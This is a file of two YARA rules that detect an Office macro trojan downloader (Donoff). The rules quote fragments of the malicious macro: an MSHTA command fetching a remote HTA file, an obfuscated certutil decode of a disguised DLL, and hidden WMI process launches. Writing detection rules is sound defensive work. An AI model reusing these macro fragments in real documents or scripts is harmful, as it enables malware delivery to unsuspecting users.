
rule TrojanDownloader_O97M_Donoff_P_MSR{
	meta:
		description = "TrojanDownloader:O97M/Donoff.P!MSR,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_00_0 = {3d 20 22 4d 53 48 54 41 20 68 74 74 70 73 3a 2f 2f 77 77 77 2e 6f 72 61 74 6f 72 69 6f 73 74 73 75 72 75 6b 79 6f 2e 63 6f 6d 2e 62 72 2f 61 72 71 75 69 76 6f 73 2f 74 65 73 74 65 2e 68 74 61 } //01 00  = "MSHTA https://www.oratoriostsurukyo.com.br/arquivos/teste.hta
		$a_00_1 = {3d 20 6f 62 6a 57 4d 49 53 65 72 76 69 63 65 2e 47 65 74 28 22 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 53 74 61 72 74 75 70 22 29 } //01 00  = objWMIService.Get("Win32_ProcessStartup")
		$a_00_2 = {3d 20 6f 62 6a 57 4d 49 53 65 72 76 69 63 65 2e 47 65 74 28 22 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 } //00 00  = objWMIService.Get("Win32_Process")
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Donoff_P_MSR_2{
	meta:
		description = "TrojanDownloader:O97M/Donoff.P!MSR,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 04 00 06 00 00 01 00 "
		
	strings :
		$a_00_0 = {3d 20 43 68 72 24 28 39 39 29 20 26 20 43 68 72 24 28 31 30 31 29 20 26 20 43 68 72 24 28 31 31 34 29 20 26 20 43 68 72 24 28 31 31 36 29 20 26 20 43 68 72 24 28 31 31 37 29 20 26 20 43 68 72 24 28 31 31 36 29 20 26 20 43 68 72 24 28 31 30 35 29 20 26 20 43 68 72 24 28 31 30 38 29 20 26 20 43 68 72 24 28 33 32 29 20 26 20 43 68 72 24 28 34 35 29 20 26 20 43 68 72 24 28 31 30 30 29 20 26 20 43 68 72 24 28 31 30 31 29 20 26 20 43 68 72 24 28 39 39 29 20 26 20 43 68 72 24 28 31 31 31 29 20 26 20 43 68 72 24 28 31 30 30 29 20 26 20 43 68 72 24 28 31 30 31 29 20 26 20 43 68 72 24 28 33 32 29 20 26 20 43 68 72 24 28 34 35 29 20 26 20 43 68 72 24 28 31 30 32 29 20 26 20 43 68 72 24 28 33 32 29 } //01 00  = Chr$(99) & Chr$(101) & Chr$(114) & Chr$(116) & Chr$(117) & Chr$(116) & Chr$(105) & Chr$(108) & Chr$(32) & Chr$(45) & Chr$(100) & Chr$(101) & Chr$(99) & Chr$(111) & Chr$(100) & Chr$(101) & Chr$(32) & Chr$(45) & Chr$(102) & Chr$(32)
		$a_00_1 = {3d 20 65 63 75 31 6f 70 20 26 20 63 66 69 6c 65 73 20 26 20 22 69 6d 61 67 65 30 30 35 2e 6a 70 67 20 22 20 26 20 63 66 69 6c 65 73 20 26 20 22 4b 37 55 49 2e 64 6c 6c 22 } //01 00  = ecu1op & cfiles & "image005.jpg " & cfiles & "K7UI.dll"
		$a_00_2 = {3d 20 6f 62 6a 50 72 6f 63 65 73 73 2e 43 72 65 61 74 65 28 63 66 69 6c 65 73 20 26 20 22 49 6e 74 65 6c 2e 65 78 65 22 2c 20 4e 75 6c 6c 2c 20 6f 62 6a 43 6f 6e 66 69 67 2c 20 69 6e 74 50 72 6f 63 65 73 73 49 44 29 } //01 00  = objProcess.Create(cfiles & "Intel.exe", Null, objConfig, intProcessID)
		$a_00_3 = {73 74 72 43 6f 6d 70 75 74 65 72 20 3d 20 22 2e 22 } //01 00  strComputer = "."
		$a_00_4 = {53 65 74 20 6f 62 6a 53 74 61 72 74 75 70 20 3d 20 6f 62 6a 57 4d 49 53 65 72 76 69 63 65 2e 47 65 74 28 22 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 53 74 61 72 74 75 70 22 29 } //01 00  Set objStartup = objWMIService.Get("Win32_ProcessStartup")
		$a_00_5 = {6f 62 6a 43 6f 6e 66 69 67 2e 53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 48 49 44 44 45 4e 5f 57 49 4e 44 4f 57 } //00 00  objConfig.ShowWindow = HIDDEN_WINDOW
	condition:
		any of ($a_*)
 
}